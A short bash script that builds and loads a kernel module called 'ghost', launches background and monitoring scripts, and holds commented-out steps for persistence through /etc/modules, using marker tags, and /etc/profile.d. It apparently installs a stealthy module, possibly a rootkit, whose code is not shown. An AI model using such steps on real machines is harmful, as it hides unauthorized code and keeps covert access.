#/bin/bash

cd ghost
make
insmod ghost.ko
# echo -ne "#<ghost>\nghost\n#<ghost>" >> etc/modules
cd ..
chmod +x dispose.sh
./dispose.sh
chmod +x run.sh
nohup ./run.sh &
echo -e "\n\n"
chmod +x monitor.sh
bash monitor.sh




# chmod +x run.sh
# chmod +x monitor.sh
# cp run.sh /etc/profile.d/
# cp monitor.sh /etc/profile.d/